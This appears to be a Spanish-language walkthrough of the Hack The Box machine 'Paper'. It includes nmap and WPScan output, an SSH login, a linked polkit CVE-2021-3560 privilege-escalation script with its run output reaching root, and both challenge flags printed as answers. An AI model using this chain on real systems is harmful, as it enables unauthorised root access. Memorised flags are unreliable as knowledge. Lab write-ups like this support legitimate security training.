---
tags:
title: Paper- Easy (HTB)
toc: true
permalink: /Paper-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.136.31
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 19:28 -0500
Initiating Ping Scan at 19:28
Scanning 10.129.136.31 [4 ports]
Completed Ping Scan at 19:28, 0.37s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:28
Completed Parallel DNS resolution of 1 host. at 19:28, 0.50s elapsed
Initiating SYN Stealth Scan at 19:28
Scanning 10.129.136.31 [65535 ports]
Discovered open port 443/tcp on 10.129.136.31
Discovered open port 80/tcp on 10.129.136.31
Discovered open port 22/tcp on 10.129.136.31
Completed SYN Stealth Scan at 19:28, 8.93s elapsed (65535 total ports)
Nmap scan report for 10.129.136.31
Host is up, received echo-reply ttl 63 (0.35s latency).
Scanned at 2026-02-10 19:28:50 EST for 9s
Not shown: 63037 closed tcp ports (reset), 2495 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
           Raw packets sent: 82454 (3.628MB) | Rcvd: 70281 (2.811MB)
-e [*] IP: 10.129.136.31
[*] Puertos abiertos: 22,80,443
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80,443 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 19:28 -0500
Nmap scan report for 10.129.136.31
Host is up (0.55s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.30 seconds
```

## Website

El sitio principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20260210215715.png)

### Internal VHOST

Al interceptar la petición con `Burpsuite`, veo que en la respuesta aparece una cabecera no común de ver.

![image-center](/assets/images/Pasted image 20260210215807.png)

La misma indica que es un nuevo subdominio, pero internamente en la maquina. Por lo que agregue al archivo `/etc/hosts`.

### office.paper

Al ir a esta web, veo algo distinto a la original.

![image-center](/assets/images/Pasted image 20260210215904.png)

Además se puede ver que corre con `Wordpress`.

![image-center](/assets/images/Pasted image 20260210220030.png)

### WPScan

```bash
wpscan --url http://office.paper -e vp,cb,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.129.136.31]
[+] Started: Tue Feb 10 20:04:36 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:23 <=============================================================================================================> (137 / 137) 100.00% Time: 00:00:23

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:11 <==============================================================================================================> (10 / 10) 100.00% Time: 00:00:11

[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Feb 10 20:05:25 2026
[+] Requests Done: 165
[+] Cached Requests: 36
[+] Data Sent: 41.919 KB
[+] Data Received: 142.084 KB
[+] Memory used: 274.68 MB
[+] Elapsed time: 00:00:48
```

http://office.paper/?static=1

![image-center](/assets/images/Pasted image 20260210221147.png)

![image-center](/assets/images/Pasted image 20260210221130.png)

![image-center](/assets/images/Pasted image 20260210221256.png)

![image-center](/assets/images/Pasted image 20260210221336.png)

![image-center](/assets/images/Pasted image 20260210234353.png)

![image-center](/assets/images/Pasted image 20260210222921.png)

![image-center](/assets/images/Pasted image 20260210223026.png)

![image-center](/assets/images/Pasted image 20260210223217.png)

```bash
ssh dwight@paper.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dwight@paper.htb's password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ cat user.txt
3a3036c8a18740ee0f475c88bb14da0d
```

```bash
[dwight@paper tmp]# /usr/bin/sudo -V
Sudo version 1.8.29
```

https://github.com/tufanturhan/Polkit-Linux-Priv/blob/main/CVE-2021-3560.py

```bash
[dwight@paper tmp]$ python3 cve.py
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit
[+] User Created with the name of ahmed
[+] Timed out at: 0.0070964991391148265
[+] Timed out at: 0.006358911089164634
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root
bash: cannot set terminal process group (64649): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper tmp]# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
[root@paper ~]# cat root.txt
b1a036524d2afbdce8494fda3334790e
```